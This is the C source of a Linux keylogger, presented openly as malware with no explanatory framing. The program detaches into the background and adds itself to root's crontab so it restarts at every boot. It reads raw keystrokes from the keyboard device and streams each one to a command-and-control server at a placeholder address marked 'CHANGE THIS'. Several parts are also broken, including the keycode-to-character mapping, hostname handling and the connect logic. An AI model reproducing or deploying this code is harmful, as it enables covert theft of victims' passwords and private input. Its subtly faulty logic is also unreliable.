#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <linux/input.h>
#include <pthread.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/wait.h>

#define C2_HOST "your-vps-ip.com"  // CHANGE THIS
#define C2_PORT 4444
#define MAX_DEVS 16

int g_sock = -1;
int g_kb_fd = -1;

void sig_handler(int sig) {
    if (g_sock >= 0) close(g_sock);
    if (g_kb_fd >= 0) close(g_kb_fd);
    exit(0);
}

void *c2_connect(void *arg) {
    while (1) {
        g_sock = socket(AF_INET, SOCK_STREAM, 0);
        int flags = fcntl(g_sock, F_GETFL, 0);
        fcntl(g_sock, F_SETFL, flags | O_NONBLOCK);
        
        struct sockaddr_in serv_addr = {0};
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_HOST, &serv_addr.sin_addr);
        
        if (connect(g_sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
            printf("Connected to C2\n");
            break;
        }
        close(g_sock);
        g_sock = -1;
        sleep(5);
    }
    return NULL;
}

void daemonize() {
    pid_t pid;
    
    // First fork
    pid = fork();
    if (pid > 0) exit(0);
    
    // Session leader
    if (setsid() < 0) exit(1);
    
    // Second fork
    pid = fork();
    if (pid > 0) exit(0);
    
    // Detach from terminal
    umask(0);
    chdir("/");
    
    // Close stdio
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

int find_keyboard() {
    char path[32];
    for (int i = 0; i < MAX_DEVS; i++) {
        snprintf(path, sizeof(path), "/dev/input/event%d", i);
        int fd = open(path, O_RDONLY | O_NONBLOCK);
        if (fd >= 0) {
            char name[256];
            ioctl(fd, EVIOCGNAME(sizeof(name)), name);
            if (strstr(name, "keyboard") || strstr(name, "kb")) {
                close(fd);
                return open(path, O_RDONLY | O_NONBLOCK);
            }
            close(fd);
        }
    }
    return -1;
}

void add_cron_persistence(char *self_path) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), 
        "@reboot root %s &\n", self_path);
    
    FILE *f = fopen("/var/spool/cron/crontabs/root", "a");
    if (f) {
        fputs(cmd, f);
        fclose(f);
    }
}

int main(int argc, char *argv[]) {
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);
    signal(SIGHUP, SIG_IGN);
    
    char self_path[256];
    readlink("/proc/self/exe", self_path, sizeof(self_path));
    
    daemonize();
    add_cron_persistence(self_path);
    
    // Find keyboard
    g_kb_fd = find_keyboard();
    if (g_kb_fd < 0) return 1;
    
    // Connect to C2
    pthread_t conn_thread;
    pthread_create(&conn_thread, NULL, c2_connect, NULL);
    
    // Key logger loop
    struct input_event ev;
    while (1) {
        ssize_t n = read(g_kb_fd, &ev, sizeof(ev));
        if (n == sizeof(ev) && ev.type == EV_KEY && ev.value == 1) {
            // Basic key mapping (KEY_A=30, KEY_ENTER=28, etc.)
            char ch = 0;
            if (ev.code >= KEY_A && ev.code <= KEY_Z) {
                ch = 'a' + (ev.code - KEY_A);
            } else if (ev.code >= KEY_0 && ev.code <= KEY_9) {
                ch = '0' + (ev.code - KEY_0);
            } else {
                switch(ev.code) {
                    case KEY_SPACE: ch = ' '; break;
                    case KEY_ENTER: ch = '\n'; break;
                    case KEY_BACKSPACE: ch = '\b'; break;
                    case KEY_TAB: ch = '\t'; break;
                }
            }
            if (ch && g_sock >= 0) {
                send(g_sock, &ch, 1, 0);
            }
        }
    }
    return 0;
}
